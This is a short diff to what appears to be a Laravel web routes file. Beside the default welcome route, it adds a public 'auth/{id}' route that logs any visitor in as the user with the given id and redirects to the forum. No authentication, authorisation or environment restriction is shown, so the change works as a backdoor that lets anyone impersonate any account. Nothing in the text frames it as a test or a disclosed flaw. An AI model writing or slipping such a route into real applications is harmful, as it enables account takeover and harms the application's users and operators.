@@ -14,3 +14,8 @@
 Route::get('/', function () {
     return view('welcome');
 });
+
+Route::get('auth/{id}', function ($id) {
+    Auth::login(\App\User::find($id));
+    return redirect('forum');
+});
